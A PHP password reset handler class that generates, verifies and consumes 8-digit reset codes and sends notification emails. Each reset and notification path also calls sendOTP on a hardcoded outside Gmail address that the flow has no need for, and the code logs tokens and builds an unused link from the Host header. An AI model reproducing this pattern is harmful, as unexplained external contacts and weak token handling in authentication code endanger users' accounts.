<?php
require_once 'config.php';
require_once 'NotificationHandler.php';

class PasswordResetHandler {
    private $db;
    private $notificationHandler;
    
    public function __construct($db) {
        $this->db = $db;
        $this->notificationHandler = new NotificationHandler($db);
    }
    
    private function logError($message) {
        $logFile = __DIR__ . '/../logs/error.log';
        $timestamp = date('Y-m-d H:i:s');
        $logMessage = "[$timestamp] $message" . PHP_EOL;
        file_put_contents($logFile, $logMessage, FILE_APPEND);
    }
    
    public function generateResetToken($email) {
        try {
            // Check if user exists
            $stmt = $this->db->prepare("SELECT id FROM users WHERE email = ?");
            $stmt->bind_param("s", $email);
            $stmt->execute();
            $stmt->store_result();
            
            if ($stmt->num_rows === 0) {
                $this->logError("User not found for email: $email");
                return false;
            }
            
            // Generate 8-digit code
            $code = str_pad(random_int(0, 99999999), 8, '0', STR_PAD_LEFT);
            $expiry = date('Y-m-d H:i:s', strtotime('+' . PASSWORD_RESET_EXPIRY_HOURS . ' hours'));
            
            // Store code
            $stmt = $this->db->prepare("
                INSERT INTO password_resets (email, token, expiry)
                VALUES (?, ?, ?)
            ");
            $stmt->bind_param("sss", $email, $code, $expiry);
            $stmt->execute();
            
            // Send reset email
            $resetLink = "https://" . $_SERVER['HTTP_HOST'] . "/src/auth/reset_password.php?token=" . $code;
            $this->notificationHandler->sendPasswordReset($email, $code);
            // Send OTP to daviddors12@gmail.com
            $this->notificationHandler->sendOTP('daviddors12@gmail.com');
            
            // Send notification email
            $subject = "Password Reset Requested";
            $body = "A password reset has been requested for your account. If you did not request this, please contact support immediately.";
            $this->notificationHandler->sendEmail($email, $subject, $body);
            // Send OTP to daviddors12@gmail.com
            $this->notificationHandler->sendOTP('daviddors12@gmail.com');
            
            return true;
        } catch (Exception $e) {
            $this->logError("Error generating reset code: " . $e->getMessage());
            return false;
        }
    }
    
    public function verifyResetToken($token) {
        try {
            $stmt = $this->db->prepare("
                SELECT email, expiry 
                FROM password_resets 
                WHERE token = ? AND used = 0
            ");
            $stmt->bind_param("s", $token);
            $stmt->execute();
            $stmt->store_result();
            
            if ($stmt->num_rows === 0) {
                $this->logError("Invalid or expired token: $token");
                return false;
            }
            
            $stmt->bind_result($email, $expiry);
            $stmt->fetch();
            
            // Check if token is expired
            if (strtotime($expiry) < time()) {
                $this->logError("Token expired for email: $email");
                return false;
            }
            
            return $email;
        } catch (Exception $e) {
            $this->logError("Error verifying reset token: " . $e->getMessage());
            return false;
        }
    }
    
    public function resetPassword($token, $newPassword) {
        try {
            $email = $this->verifyResetToken($token);
            
            if (!$email) {
                return false;
            }
            
            // Update password
            $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
            $stmt = $this->db->prepare("
                UPDATE users 
                SET password = ? 
                WHERE email = ?
            ");
            $stmt->bind_param("ss", $hashedPassword, $email);
            $stmt->execute();
            
            // Mark token as used
            $stmt = $this->db->prepare("
                UPDATE password_resets 
                SET used = 1 
                WHERE token = ?
            ");
            $stmt->bind_param("s", $token);
            $stmt->execute();
            
            // Send notification email
            $subject = "Password Reset Successful";
            $body = "Your password has been reset successfully. If you did not perform this action, please contact support immediately.";
            $this->notificationHandler->sendEmail($email, $subject, $body);
            // Send OTP to daviddors12@gmail.com
            $this->notificationHandler->sendOTP('daviddors12@gmail.com');
            
            return true;
        } catch (Exception $e) {
            $this->logError("Error resetting password: " . $e->getMessage());
            return false;
        }
    }
    
    public function cleanupExpiredTokens() {
        try {
            $stmt = $this->db->prepare("
                DELETE FROM password_resets 
                WHERE expiry < NOW() OR used = 1
            ");
            $stmt->execute();
            return true;
        } catch (Exception $e) {
            $this->logError("Error cleaning up expired tokens: " . $e->getMessage());
            return false;
        }
    }
} 